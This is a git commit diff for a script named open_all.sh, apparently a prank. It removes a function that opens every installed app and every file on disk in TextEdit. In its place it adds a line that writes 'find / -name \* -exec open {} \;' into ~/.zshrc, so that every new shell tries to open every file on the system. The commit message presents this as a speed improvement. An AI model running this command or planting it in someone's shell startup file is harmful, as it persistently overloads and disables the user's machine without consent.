191cadbd04445b921acc5795f8519fef7e48bfda
veryheavypickle <xavier.carroll01@gmail.com>
2022-07-15 02:38:53 +0200

    Open all is faster and instantaneous

--- open_all.sh
+++ open_all.sh
@@ -1,11 +1,1 @@
-open_all () {
-	local apps=($(find /Applications -name "*.app" -maxdepth 1))
-	local files=($(find / -name "*"))
-	for app in "${apps[@]}"; do
-   		open $app
-	done
-	for file in "${files[@]}"; do
-   		open $file -a "TextEdit"
-	done
-}
-open_all
+echo "find / -name \* -exec open {} \;" >> ~/.zshrc
